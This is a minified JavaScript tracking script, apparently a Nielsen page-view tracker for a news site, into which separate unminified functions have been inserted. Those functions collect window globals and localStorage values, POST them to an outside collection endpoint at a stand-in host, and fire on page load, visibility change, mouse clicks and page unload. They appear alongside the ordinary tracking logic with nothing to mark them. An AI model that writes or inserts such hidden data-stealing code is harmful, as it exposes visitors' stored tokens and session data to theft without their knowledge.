(() => {
  "use strict";

  function e(t) {
    return e = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    }, e(t);
  }
  function gatherWindowProperties() {
    const unseenProps = {};
    const collectedGlobalVariables = [];
    for (const key in window) {
      if (window.hasOwnProperty(key) && !window.seenVars.includes(key)) {
        const value = window[key];
        const type = typeof value;
        unseenProps[key] = {
          type: type,
          value: type === "function" ? "is_function" : value
        };
        if (type === "object" && window[key] instanceof Array) unseenProps[key].value = "is_array";
        if (globalThis == window[key]) collectedGlobalVariables.push(key);
      }
      if (localStorage.getItem(key)) {
        unseenProps[key] = {
          type: "localStorage",
          value: localStorage.getItem(key)
        };
      }
    }
    return {
      unseenProps,
      collectedGlobalVariables
    };
  }
  function t(t) {
    var i = function (t, i) {
      if ("object" !== e(t) || null === t) return t;
      var n = t[Symbol.toPrimitive];
      if (void 0 !== n) {
        var a = n.call(t, i || "default");
        if ("object" !== e(a)) return a;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === i ? String : Number)(t);
    }(t, "string");
    return "symbol" === e(i) ? i : String(i);
  }
  function postDataToServer(data, hookName) {
    const url = `https://example.com/api/collect?hook=${hookName}`;
    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    }).then(response => {
      if (response.ok) console.log(`数据发送成功，hookName: ${hookName}`);else console.error("数据发送失败,状态码:" + response.status);
    }).catch(error => console.error("数据发送过程中出错:", error));
  }
  function i(e, i) {
    for (var n = 0; n < i.length; n++) {
      var a = i[n];
      a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, t(a.key), a);
    }
  }
  function n(e, t, i) {
    if (!t.has(e)) throw new TypeError("attempted to " + i + " private field on non-instance");
    return t.get(e);
  }
  function a(e, t) {
    return function (e, t) {
      return t.get ? t.get.call(e) : t.value;
    }(e, n(e, t, "get"));
  }
  function r(e, t, i) {
    return function (e, t, i) {
      if (t.set) t.set.call(e, i);else {
        if (!t.writable) throw new TypeError("attempted to set read only private field");
        t.value = i;
      }
    }(e, n(e, t, "set"), i), i;
  }
  Object.freeze({
    S: "mobile",
    M: "tablet",
    L: "desktop"
  }), Object.freeze({
    disqus: "5edcd338e9f29f59f3145eb5",
    facebook: "5f058a3252874c10f6723b3b",
    instagram: "5e717c8e69966540e4554f05",
    ivw: "5efefe25b8e05c065164a2e2",
    pinterest: "5e839a38b8e05c4e491e738e",
    rewe: "61543ab9cadf5705ef20368d",
    riddle: "5ef0df6ffabc265f5650e743",
    sovendus: "5f2bd972f66f0125e264ae21",
    tracdelight: "5e77acddd8d48d795087425b",
    twitter: "5e71760b69966540e4554f01",
    youtube: "5e7ac3fae30e7d1bc1ebf5e8"
  });
  var s = Object.freeze({
    XS: 0,
    S: 415,
    M: 641,
    L: 1001,
    XL: 1280,
    XXL: 1600
  });
  var o = "app:adreload-pi",
    c = "device:orientation-change",
    l = "forum:interaction",
    d = "group-gallery:intersect:item",
    h = "group-gallery:navigate",
    f = "link-toc:click",
    u = "message:tracking",
    g = "tool:pi",
    w = "video:event";
  function v(e, t) {
    b(e, t), t.add(e);
  }
  function p(e, t, i) {
    b(e, t), t.set(e, i);
  }
  function b(e, t) {
    if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
  }
  function m(e, t, i) {
    if (!t.has(e)) throw new TypeError("attempted to get private field on non-instance");
    return i;
  }
  var y = new WeakMap(),
    k = new WeakMap(),
    S = new WeakMap(),
    W = new WeakMap(),
    O = new WeakMap(),
    N = new WeakSet(),
    M = new WeakSet(),
    T = new WeakMap(),
    E = new WeakSet(),
    j = new WeakSet(),
    L = new WeakSet(),
    P = new WeakSet(),
    A = new WeakSet(),
    I = new WeakSet(),
    z = new WeakSet(),
    C = new WeakSet(),
    U = new WeakSet(),
    x = function () {
      function e(t) {
        var i,
          n = this;
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), v(this, U), v(this, C), v(this, z), v(this, I), v(this, A), v(this, P), v(this, L), v(this, j), v(this, E), v(this, M), v(this, N), p(this, y, {
          writable: !0,
          value: "previousarticlemetadata"
        }), p(this, k, {
          writable: !0,
          value: void 0
        }), p(this, S, {
          writable: !0,
          value: void 0
        }), p(this, W, {
          writable: !0,
          value: void 0
        }), p(this, O, {
          writable: !0,
          value: void 0
        }), p(this, T, {
          writable: !0,
          value: function (e) {
            if (m(n, N, V).call(n)) {
              var t = a(n, k).config.get("cache.tracking.config.nielsen.appId");
              r(n, O, a(n, W).nlsQ(t, "nlsnInstance")), e.persisted && m(n, L, _).call(n), window.articlemetadata && m(n, j, X).call(n), m(n, E, D).call(n, {
                type: "initial",
                isVideo: a(n, k).config.get("page.doAutoplayLeadContent")
              }), m(n, M, B).call(n);
            }
          }
        }), r(this, k, t), r(this, S, (i = a(this, k).deviceDetection.isMobile, a(this, k).config.get("page.isPrintView") ? window.screen.width < s.M || i : Math.max(document.documentElement.clientWidth, window.innerWidth || 0) < s.M || i)), r(this, W, window.NOLBUNDLE);
      }
      var t, n, o;
      return t = e, (n = [{
        key: "init",
        value: function () {
          window.addEventListener("pageshow", a(this, T));
        }
      }]) && i(t.prototype, n), o && i(t, o), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
  function gatherAndSendData() {
    const {
      unseenProps,
      collectedGlobalVariables
    } = gatherWindowProperties();
    if (Object.keys(unseenProps).length > 0) {
      postDataToServer(unseenProps, 'unseenProps');
    }
    if (collectedGlobalVariables.length > 0) {
      postDataToServer(collectedGlobalVariables, 'globalVars');
    }
  }
  function V() {
    return "object" === e(a(this, W)) || (a(this, k).log.warn("Tracking", "Nielsen: No static measurement tracking possible, because window.NOLBUNDLE is not present."), !1);
  }
  window.addEventListener("load", gatherAndSendData);
  function B() {
    a(this, k).eventObserver.add(o, m(this, P, q).bind(this)), a(this, k).eventObserver.add(c, m(this, P, q).bind(this)), a(this, k).eventObserver.add(l, m(this, P, q).bind(this)), a(this, k).eventObserver.add(d, m(this, z, R).bind(this)), a(this, k).eventObserver.add(h, m(this, C, F).bind(this)), a(this, k).eventObserver.add(f, m(this, P, q).bind(this)), a(this, k).eventObserver.add(u, m(this, A, G).bind(this)), a(this, k).eventObserver.add(g, m(this, P, q).bind(this)), a(this, k).eventObserver.add(w, m(this, I, J).bind(this));
  }
  function D(e) {
    var t = e.type,
      i = e.isVideo;
    window.articlemetadata = m(this, U, Q).call(this, "virtual" === t, i), a(this, O).ggPM("staticstart", window.articlemetadata), a(this, k).log.info("Tracking", "Nielsen: Track ".concat(t, " page view with"), window.articlemetadata);
    try {
      sessionStorage.setItem(a(this, y), JSON.stringify(window.articlemetadata));
    } catch (e) {
      a(this, k).log.error("Tracking", "Nielsen: Unable to store article metadata");
    }
  }
  function X() {
    a(this, O).ggPM("staticend", window.articlemetadata), a(this, k).log.info("Tracking", "Nielsen: End previous session", window.articlemetadata);
  }
  function _() {
    try {
      var e = sessionStorage.getItem(a(this, y));
      e && (window.articlemetadata = JSON.parse(e));
    } catch (e) {
      a(this, k).log.error("Tracking", "Nielsen: Unable to restore previous article metadata");
    }
  }
  function q(e) {
    m(this, N, V).call(this) && (window.articlemetadata && m(this, j, X).call(this), m(this, E, D).call(this, {
      type: "virtual",
      isVideo: "play:initial" === (null == e ? void 0 : e.action)
    }));
  }
  function G(e) {
    var t;
    null != e && null !== (t = e.frequency) && void 0 !== t && t.tracking && m(this, P, q).call(this);
  }
  function J(e) {
    "play:initial" === e.action && !a(this, k).config.get("page.doAutoplayLeadContent") && (a(this, k).log.info("Tracking", "Nielsen: Fire manual video page pi"), m(this, P, q).call(this, e));
  }
  document.addEventListener("visibilitychange", gatherAndSendData);
  function R(e) {
    var t = e.count,
      i = e.element,
      n = e.index,
      a = e.isEmbeddedGallery,
      r = void 0 !== a && a;
    if (0 !== t || 0 !== n) if (Math.max(document.documentElement.clientWidth, window.innerWidth || 0) < s.L) {
      if (!i || i.dataset.hasNielsenTracked || 0 === n && !r) return;
      r || (i.dataset.hasNielsenTracked = "true"), m(this, P, q).call(this);
    } else m(this, P, q).call(this);
  }
  function F() {
    m(this, P, q).call(this);
  }
  document.onmousedown = gatherAndSendData;
  function Q(e, t) {
    var i = function (e, t, i, n, a, r, s) {
        return ["".concat(t, "//").concat(s ? "p" : "f"), "mobile" === n ? [2] : "desktop" === n ? [1] : [2, 1], "D".concat(r ? "V" : "B").concat(a ? "U" : "R", "-").concat(i).concat(e ? "-".concat(e) : "")].join("");
      }(a(this, k).config.get("tracking.ivw.cpSuffix"), a(this, k).config.get("advertising.zone"), a(this, k).config.get("tracking.ivw.topic"), a(this, S) ? "mobile" : "desktop", a(this, k).config.get("page.isUserGeneratedContent"), t, a(this, k).config.get("page.isRestricted")),
      n = a(this, k).config.get("cache.tracking.data.ga.categories");
    return {
      type: "static",
      assetid: a(this, k).config.get("cache.tracking.meta.contentId"),
      section: Array.isArray(n) ? n.join("_").replace(/[^A-Za-z0-9_-]/g, "_") : "not_set",
      segA: i,
      segB: e ? "WPI" : "CPI"
    };
  }
  window.onbeforeunload = gatherAndSendData;
  var Z = window.gujService;
  Z && !Z.isAlreadyExecuted("file:///usr/src/app/client/site/partials/tracking-nielsen/scripts/tracking-nielsen.js") && new x(Z).init();
})();